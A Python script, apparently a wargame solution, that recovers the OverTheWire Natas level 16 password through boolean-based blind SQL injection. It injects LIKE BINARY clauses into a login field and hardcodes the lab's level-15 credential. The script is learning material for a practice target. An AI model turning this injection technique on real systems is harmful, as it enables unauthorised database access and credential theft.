import requests, sys

# used variables
payload = "natas16' AND password LIKE BINARY "
alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!?.,;{[}]|"
guessed = []
session = requests.Session()

# constant variables
URL = "http://natas15.natas.labs.overthewire.org/"
NATAS_USER = "natas15"
NATAS_PASS = "GB6USCJYJjwLyYhZUNkE1NwDueiTow6g"

def main():
    global payload, guessed
    found = False
    password = ""
    print("Starting brute force... This may take a moment.\n")

    while len(guessed) < 32:
        for char in alphabet:
            sys.stdout.write(f"\rTrying char {char}")
            sys.stdout.flush()
            response = session.post(
                URL,
                data = {"username": 'natas16" AND BINARY password LIKE "' + password + char + '%" # '},
                auth=(NATAS_USER, NATAS_PASS))
            if "user exists" in response.text:
                found = True
                password += char
                guessed.append(char)
                print(f"{len(guessed)}\rNew char found! Pass so far : {password}")
                break
        if not found:
            print(f"No char was good, code must be wrong... Exiting \n")
            break
    
    print(f"The recovered password is : {password}")
    return None

if __name__ == "__main__":
    main()
